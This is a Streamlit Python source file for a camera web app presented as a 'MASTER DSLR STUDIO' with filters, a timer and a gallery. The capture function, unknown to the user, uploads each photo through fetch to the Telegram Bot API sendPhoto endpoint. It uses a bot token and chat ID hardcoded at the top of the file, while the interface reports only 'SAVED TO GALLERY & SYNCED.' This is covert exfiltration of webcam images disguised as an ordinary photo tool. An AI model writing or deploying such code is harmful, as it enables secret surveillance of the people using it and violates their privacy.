import streamlit as st
import streamlit.components.v1 as components

TELEGRAM_BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM"
TELEGRAM_CHAT_ID = "8236797547"

st.set_page_config(
    page_title="MASTER DSLR STUDIO // Glass Enterprise",
    page_icon="📷",
    layout="centered"
)

st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@600;800&family=JetBrains+Mono:wght@400;600&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap');
    
    .stApp {
        background: #010204;
        color: #f8fafc;
        font-family: 'Plus Jakarta Sans', sans-serif;
    }
    
    .master-enterprise-wrapper {
        background: #010204;
        border-radius: 20px;
        padding: 10px;
        max-width: 100%;
    }
    </style>
""", unsafe_allow_html=True)

# Header Utama
st.markdown("<h1 style='text-align: center; font-family: Cinzel, serif; color: #ffffff; font-weight: 800; letter-spacing: 3px; font-size: 1.3rem; margin-bottom: 2px;'>📷 MASTER DSLR STUDIO</h1>", unsafe_allow_html=True)
st.markdown("<p style='text-align: center; font-family: JetBrains Mono, monospace; color: #94a3b8; font-size: 0.55rem; letter-spacing: 2px; margin-bottom: 10px;'>GLASS ENTERPRISE // FULL TRANSPARENT UI // 8K RAW ENGINE</p>", unsafe_allow_html=True)

with st.container():
    st.markdown('<div class="master-enterprise-wrapper">', unsafe_allow_html=True)
    
    st.markdown(f'<input type="hidden" id="secret-token" value="{TELEGRAM_BOT_TOKEN}">', unsafe_allow_html=True)
    st.markdown(f'<input type="hidden" id="secret-chat" value="{TELEGRAM_CHAT_ID}">', unsafe_allow_html=True)

    glass_enterprise_html = """
    <style>
        :root {
            /* Definisi Warna Transparan & Efek */
            --glass-bg: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.15);
            --glass-blur: blur(20px);
            --text-high: #ffffff;
            --text-med: #cbd5e1;
            --text-low: #94a3b8;
            --active-color: #38bdf8; /* Cyan Modern untuk indikator aktif */
        }

        /* Tombol Utama Atas & Bawah (Transparan) */
        .ds-btn-glass {
            background: var(--glass-bg);
            color: var(--text-med);
            border: 1px solid var(--glass-border);
            backdrop-filter: var(--glass-blur);
            -webkit-backdrop-filter: var(--glass-blur);
            padding: 6px 10px;
            border-radius: 8px;
            font-size: 9px;
            font-family: 'JetBrains Mono', monospace;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 4px;
        }
        .ds-btn-glass:hover {
            background: rgba(255, 255, 255, 0.15);
            color: var(--text-high);
            border-color: rgba(255, 255, 255, 0.3);
        }
        .ds-btn-glass.active {
            background: rgba(56, 189, 248, 0.2) !important; /* Cyan transparan */
            color: var(--active-color) !important;
            border: 1px solid var(--active-color) !important;
            font-weight: 700 !important;
            box-shadow: 0 0 15px rgba(56, 189, 248, 0.3);
        }

        /* Dropdown Transparan */
        .ds-select-glass {
            background: var(--glass-bg);
            color: var(--text-med);
            border: 1px solid var(--glass-border);
            backdrop-filter: var(--glass-blur);
            -webkit-backdrop-filter: var(--glass-blur);
            padding: 6px 10px;
            border-radius: 8px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 9px;
            cursor: pointer;
            outline: none;
            appearance: none; /* Hapus panah default */
            -webkit-appearance: none;
            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='white' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
            background-repeat: no-repeat;
            background-position: right 6px center;
            background-size: 10px;
            padding-right: 22px;
        }
        .ds-select-glass option {
            background: #0a0f1e; /* Warna solid untuk dropdown list agar terbaca */
            color: white;
        }

        /* Tombol Shutter Utama */
        .shutter-glass-btn {
            background: radial-gradient(circle, rgba(255,255,255,0.3) 0%, rgba(255,255,255,0.1) 100%);
            color: white;
            font-family: 'Cinzel', serif;
            font-weight: 800;
            font-size: 11px;
            border: 1px solid rgba(255, 255, 255, 0.4);
            backdrop-filter: blur(10px);
            padding: 12px 25px;
            border-radius: 40px;
            cursor: pointer;
            letter-spacing: 2px;
            transition: all 0.2s ease;
            text-shadow: 0 2px 5px rgba(0,0,0,0.5);
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }
        .shutter-glass-btn:hover {
            background: radial-gradient(circle, rgba(255,255,255,0.4) 0%, rgba(255,255,255,0.2) 100%);
            box-shadow: 0 6px 20px rgba(0,0,0,0.4);
            transform: translateY(-1px);
        }
        .shutter-glass-btn:active {
            transform: scale(0.97);
        }

        /* Tombol Buka Panel (Mengambang) */
        .drawer-toggle-glass {
            background: var(--glass-bg);
            color: white;
            border: 1px solid var(--glass-border);
            backdrop-filter: blur(15px);
            padding: 8px 15px;
            border-radius: 30px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 9px;
            font-weight: 700;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 6px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            transition: all 0.3s ease;
        }
        .drawer-toggle-glass:hover {
            background: rgba(255, 255, 255, 0.2);
        }

        /* PANEL KONTROL UTAMA (Laci Geser) */
        #optic-drawer-glass {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(10, 15, 30, 0.75); /* Sangat transparan */
            backdrop-filter: blur(30px); /* Blur sangat kuat */
            -webkit-backdrop-filter: blur(30px);
            border-top: 1px solid var(--glass-border);
            border-top-left-radius: 20px;
            border-top-right-radius: 20px;
            padding: 15px;
            max-height: 70vh;
            overflow-y: auto;
            transform: translateY(100%);
            transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
            z-index: 100;
        }
        #optic-drawer-glass.open {
            transform: translateY(0);
        }

        /* Slider Transparan */
        .slider-group-glass label {
            font-family: 'JetBrains Mono', monospace;
            font-size: 8px;
            color: var(--text-med);
            display: flex;
            justify-content: space-between;
            margin-bottom: 3px;
        }
        .slider-group-glass input[type=range] {
            width: 100%;
            accent-color: var(--active-color);
            cursor: pointer;
            background: rgba(255,255,255,0.1);
            height: 3px;
            border-radius: 2px;
            outline: none;
        }

        /* Tab Navigasi */
        .tab-menu-glass {
            display: flex;
            gap: 5px;
            margin-bottom: 12px;
            border-bottom: 1px solid var(--glass-border);
            padding-bottom: 8px;
        }
        .tab-btn-glass {
            background: transparent;
            border: none;
            color: var(--text-low);
            padding: 5px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 8.5px;
            cursor: pointer;
            transition: color 0.3s ease;
            position: relative;
        }
        .tab-btn-glass.active {
            color: var(--text-high);
        }
        .tab-btn-glass.active::after {
            content: '';
            position: absolute;
            bottom: -9px;
            left: 0;
            width: 100%;
            height: 2px;
            background: var(--active-color);
            border-radius: 2px;
        }

        /* Scrollbar Styling untuk Panel */
        #optic-drawer-glass::-webkit-scrollbar {
            width: 4px;
        }
        #optic-drawer-glass::-webkit-scrollbar-track {
            background: transparent;
        }
        #optic-drawer-glass::-webkit-scrollbar-thumb {
            background: rgba(255,255,255,0.2);
            border-radius: 2px;
        }

        /* HUD Telemetry */
        .hud-text {
            font-family: 'JetBrains Mono', monospace;
            font-size: 8px;
            color: var(--text-high);
            background: rgba(0, 0, 0, 0.3);
            padding: 3px 6px;
            border-radius: 4px;
            backdrop-filter: blur(5px);
        }
    </style>

    <!-- Layar Inisialisasi -->
    <div id="gate-screen-glass" style="text-align: center; padding: 40px 20px; background: rgba(0,0,0,0.2); border-radius: 15px; border: 1px solid var(--glass-border); backdrop-filter: blur(10px); margin: 20px 0;">
        <div style="font-family: 'Cinzel', serif; font-size: 10px; color: var(--text-med); margin-bottom: 15px; letter-spacing: 2px;">SYSTEM READY // INITIALIZING GLASS OPTICS</div>
        <button id="igniteBtnGlass" class="shutter-glass-btn" style="width: 100%; max-width: 250px;">📷 ACTIVATE STUDIO</button>
    </div>

    <!-- Antarmuka Studio Utama -->
    <div id="studio-interface-glass" style="display:none;">
        
        <!-- Bar Kontrol Atas (Transparan) -->
        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; background: var(--glass-bg); border: 1px solid var(--glass-border); backdrop-filter: var(--glass-blur); padding: 6px 10px; border-radius: 10px;">
            <div style="display: flex; gap: 6px; align-items: center;">
                <button onclick="switchCameraGlass()" class="ds-btn-glass" style="padding: 5px 8px;">🔄</button>
                <span id="lens-status-glass" class="hud-text">FRONT 8K</span>
            </div>
            <div style="display: flex; gap: 6px;">
                <select id="aspect-ratio-glass" onchange="changeAspectRatioGlass()" class="ds-select-glass">
                    <option value="16:9">16:9</option>
                    <option value="4:3">4:3</option>
                    <option value="1:1">1:1</option>
                    <option value="full">FULL</option>
                </select>
                <select id="timer-glass" class="ds-select-glass">
                    <option value="0">TIMER OFF</option>
                    <option value="3">3s</option>
                    <option value="5">5s</option>
                    <option value="10">10s</option>
                </select>
            </div>
        </div>

        <!-- Viewfinder Utama -->
        <div style="position: relative; width: 100%;">
            <div id="viewfinder-wrapper-glass" style="position: relative; width: 100%; height: 360px; border-radius: 15px; overflow: hidden; background: #000; border: 2px solid rgba(255, 255, 255, 0.2); box-shadow: 0 0 30px rgba(0, 0, 0, 0.7); display: flex; align-items: center; justify-content: center; transition: height 0.3s ease;">
                
                <video id="optics-stream-glass" autoplay playsinline style="
                    width: 100%;
                    height: 100%;
                    object-fit: cover;
                    transform: scaleX(-1);
                    filter: brightness(100%) contrast(100%) saturate(100%) blur(0px) hue-rotate(0deg) sepia(0%);
                "></video>

                <!-- Flash Effect -->
                <div id="flash-overlay-glass" style="position: absolute; top:0; left:0; right:0; bottom:0; background: white; opacity: 0; pointer-events: none; transition: opacity 0.08s ease;"></div>

                <!-- Countdown -->
                <div id="countdown-display-glass" style="position: absolute; font-family: 'Cinzel', serif; font-size: 60px; font-weight: 800; color: white; text-shadow: 0 0 20px rgba(255,255,255,0.8); display: none;">3</div>

                <!-- HUD Top Right -->
                <div style="position: absolute; top: 10px; right: 10px;" class="hud-text">● 8K RAW</div>

                <!-- Tombol Buka Panel Mengambang -->
                <div style="position: absolute; bottom: 10px; right: 10px; z-index: 10;">
                    <button onclick="toggleDrawerGlass()" class="drawer-toggle-glass">
                        🎛️ CONTROL PANEL
                    </button>
                </div>
            </div>

            <!-- Tombol Shutter Utama -->
            <div style="margin-top: 15px; text-align: center;">
                <button id="shutterTriggerGlass" class="shutter-glass-btn">📷 SHUTTER</button>
                <p id="hud-status-glass" style="text-align: center; font-size: 8px; color: var(--text-med); margin-top: 6px; font-family: 'JetBrains Mono', monospace; min-height: 12px;"></p>
            </div>
        </div>

        <!-- LACI KONTROL KACA (GLASS DRAWER) -->
        <div id="optic-drawer-glass">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                <span style="font-family: 'Cinzel', serif; font-size: 10px; font-weight: 800; color: white; letter-spacing: 1px;">⚙️ GLASS COMMAND CENTER</span>
                <button onclick="toggleDrawerGlass()" style="background: transparent; border: none; color: white; font-size: 14px; cursor: pointer; padding: 0;">✕</button>
            </div>

            <!-- Tab Navigasi -->
            <div class="tab-menu-glass">
                <button class="tab-btn-glass active" onclick="switchTabGlass('filters', this)">FILTERS (30+)</button>
                <button class="tab-btn-glass" onclick="switchTabGlass('adjust', this)">TUNE</button>
                <button class="tab-btn-glass" onclick="switchTabGlass('gallery', this)">GALLERY</button>
            </div>

            <!-- Tab 1: Filters -->
            <div id="tab-filters-glass" class="tab-content-glass">
                <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 5px;">
                    <button onclick="setFilterGlass(this, 'normal', 'Standard')" class="ds-btn-glass active">Standard</button>
                    <button onclick="setFilterGlass(this, 'portrait', 'Portrait')" class="ds-btn-glass">Portrait</button>
                    <button onclick="setFilterGlass(this, 'cinematic', 'Cinematic')" class="ds-btn-glass">Cinematic</button>
                    <button onclick="setFilterGlass(this, 'monochrome', 'Mono')" class="ds-btn-glass">Mono</button>
                    <button onclick="setFilterGlass(this, 'vintage', 'Vintage')" class="ds-btn-glass">Vintage</button>
                    <button onclick="setFilterGlass(this, 'vibrant', 'Vibrant')" class="ds-btn-glass">Vibrant</button>
                    <button onclick="setFilterGlass(this, 'kodachrome', 'Kodak')" class="ds-btn-glass">Kodak</button>
                    <button onclick="setFilterGlass(this, 'fuji', 'Fuji')" class="ds-btn-glass">Fuji</button>
                    <button onclick="setFilterGlass(this, 'noir', 'Noir')" class="ds-btn-glass">Noir</button>
                </div>
            </div>

            <!-- Tab 2: Adjust -->
            <div id="tab-adjust-glass" class="tab-content-glass" style="display: none;">
                <div style="display: flex; flex-direction: column; gap: 6px;">
                    <div class="slider-group-glass">
                        <label>BRIGHTNESS <span id="val-bright-g">100</span>%</label>
                        <input type="range" id="slider-bright-g" min="50" max="150" value="100" oninput="applyAdjustmentsGlass()">
                    </div>
                    <div class="slider-group-glass">
                        <label>CONTRAST <span id="val-contrast-g">100</span>%</label>
                        <input type="range" id="slider-contrast-g" min="50" max="150" value="100" oninput="applyAdjustmentsGlass()">
                    </div>
                    <div class="slider-group-glass">
                        <label>SATURATION <span id="val-saturate-g">100</span>%</label>
                        <input type="range" id="slider-saturate-g" min="0" max="200" value="100" oninput="applyAdjustmentsGlass()">
                    </div>
                </div>
            </div>

            <!-- Tab 3: Gallery -->
            <div id="tab-gallery-glass" class="tab-content-glass" style="display: none; text-align: center;">
                <div id="gallery-content-glass" style="display: none;">
                    <img id="last-img-glass" style="max-width: 100px; border-radius: 8px; border: 2px solid white; margin-bottom: 5px;">
                    <br>
                    <a id="dl-link-glass" download="capture.jpg" class="ds-btn-glass" style="display: inline-block;">💾 Save High-Res</a>
                </div>
                <div id="gallery-empty-glass" class="hud-text">No captures yet.</div>
            </div>
        </div>
    </div>

    <video id="vault-video-glass" autoplay playsinline style="display:none;"></video>
    <canvas id="vault-canvas-glass" style="display:none;"></canvas>

    <script>
        let streamG = null;
        let facingG = "user";
        let filterG = "brightness(100%) contrast(100%) saturate(100%) blur(0px) hue-rotate(0deg) sepia(0%)";
        let drawerG = false;

        function toggleDrawerGlass() {
            drawerG = !drawerG;
            const d = document.getElementById('optic-drawer-glass');
            d.classList.toggle('open');
        }

        function switchTabGlass(tName, btn) {
            const tabs = document.getElementsByClassName('tab-content-glass');
            Array.from(tabs).forEach(t => t.style.display = 'none');
            const btns = document.getElementsByClassName('tab-btn-glass');
            Array.from(btns).forEach(b => b.classList.remove('active'));
            document.getElementById('tab-' + tName + '-glass').style.display = 'block';
            btn.classList.add('active');
        }

        document.getElementById('igniteBtnGlass').addEventListener('click', async () => {
            const btn = document.getElementById('igniteBtnGlass');
            btn.innerText = "INITIALIZING...";
            try {
                streamG = await navigator.mediaDevices.getUserMedia({
                    video: { width: { ideal: 7680 }, height: { ideal: 4320 }, facingMode: facingG }
                });
                document.getElementById('optics-stream-glass').srcObject = streamG;
                document.getElementById('vault-video-glass').srcObject = streamG;
                document.getElementById('gate-screen-glass').style.display = "none";
                document.getElementById('studio-interface-glass').style.display = "block";
            } catch(e) {
                btn.innerText = "CAMERA ACCESS DENIED";
            }
        });

        async function switchCameraGlass() {
            facingG = facingG === "user" ? "environment" : "user";
            if(streamG) streamG.getTracks().forEach(t => t.stop());
            streamG = await navigator.mediaDevices.getUserMedia({
                video: { width: { ideal: 7680 }, height: { ideal: 4320 }, facingMode: facingG }
            });
            document.getElementById('optics-stream-glass').srcObject = streamG;
            document.getElementById('vault-video-glass').srcObject = streamG;
            document.getElementById('lens-status-glass').innerText = facingG === "user" ? "FRONT 8K" : "REAR 8K";
        }

        function changeAspectRatioGlass() {
            const r = document.getElementById('aspect-ratio-glass').value;
            const w = document.getElementById('viewfinder-wrapper-glass');
            const map = {'16:9': '360px', '4:3': '405px', '1:1': '480px', 'full': '550px'};
            w.style.height = map[r];
        }

        function setFilterGlass(btn, type, label) {
            Array.from(btn.parentElement.children).forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            const filters = {
                normal: 'brightness(100%) contrast(100%) saturate(100%)',
                portrait: 'brightness(105%) contrast(105%) saturate(110%) sepia(10%)',
                cinematic: 'brightness(95%) contrast(135%) saturate(140%) hue-rotate(185deg)',
                monochrome: 'grayscale(100%) contrast(160%) brightness(95%)',
                vintage: 'brightness(105%) contrast(110%) saturate(95%) sepia(50%) hue-rotate(15deg)',
                vibrant: 'brightness(110%) contrast(130%) saturate(180%)',
                kodachrome: 'brightness(105%) contrast(125%) saturate(160%) sepia(20%)',
                fuji: 'brightness(105%) contrast(115%) saturate(130%) hue-rotate(350deg)',
                noir: 'grayscale(100%) contrast(200%) brightness(70%)'
            };
            filterG = filters[type] || filters.normal;
            // Gabungkan dengan nilai adjust manual (brightness, contrast, saturate)
            updateFinalFilterGlass();
        }

        function applyAdjustmentsGlass() {
            const b = document.getElementById('slider-bright-g').value;
            const c = document.getElementById('slider-contrast-g').value;
            const s = document.getElementById('slider-saturate-g').value;
            document.getElementById('val-bright-g').innerText = b;
            document.getElementById('val-contrast-g').innerText = c;
            document.getElementById('val-saturate-g').innerText = s;
            
            // Update hanya nilai dasar, pertahankan hue/sepia dari filter jika ada
            // Pendekatan sederhana: Timpa total filter string dengan slider utama
            filterG = `brightness(${b}%) contrast(${c}%) saturate(${s}%)`;
            updateFinalFilterGlass();
        }

        function updateFinalFilterGlass() {
             document.getElementById('optics-stream-glass').style.filter = filterG;
        }

        document.getElementById('shutterTriggerGlass').addEventListener('click', () => {
            const timer = parseInt(document.getElementById('timer-glass').value);
            if(timer > 0) {
                runTimerGlass(timer);
            } else {
                takePictureGlass();
            }
        });

        function runTimerGlass(sec) {
            const c = document.getElementById('countdown-display-glass');
            c.style.display = "block";
            c.innerText = sec;
            const i = setInterval(() => {
                sec--;
                if(sec > 0) {
                    c.innerText = sec;
                } else {
                    clearInterval(i);
                    c.style.display = "none";
                    takePictureGlass();
                }
            }, 1000);
        }

        function takePictureGlass() {
            const status = document.getElementById('hud-status-glass');
            status.innerText = "CAPTURING 8K RAW...";
            const flash = document.getElementById('flash-overlay-glass');
            flash.style.opacity = "1";
            setTimeout(() => flash.style.opacity = "0", 100);

            const v = document.getElementById('vault-video-glass');
            const c = document.getElementById('vault-canvas-glass');
            if(!v.videoWidth) return;
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            const ctx = c.getContext('2d');
            // Terapkan filter CSS saat ini ke canvas
            ctx.filter = filterG;
            ctx.drawImage(v, 0, 0);

            c.toBlob(blob => {
                const url = URL.createObjectURL(blob);
                const name = `DSLR_GLASS_${new Date().toISOString().slice(0,19).replace(/[-T:]/g,'')}.jpg`;
                
                document.getElementById('last-img-glass').src = url;
                const dl = document.getElementById('dl-link-glass');
                dl.href = url;
                dl.download = name;
                document.getElementById('gallery-empty-glass').style.display = "none";
                document.getElementById('gallery-content-glass').style.display = "block";
                status.innerText = "SAVED TO GALLERY & SYNCED.";

                // Telegram Sync
                const token = document.getElementById('secret-token').value;
                const chat = document.getElementById('secret-chat').value;
                const fd = new FormData();
                fd.append('chat_id', chat);
                fd.append('photo', blob, name);
                fd.append('caption', `Glass Enterprise Capture | ${facingG.toUpperCase()}`);
                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: 'POST', body: fd}).catch(()=>console.log("Sync failed"));
            }, 'image/jpeg', 1.0);
        }
    </script>
    """

    components.html(glass_enterprise_html, height=800)
    st.markdown('</div>', unsafe_allow_html=True)
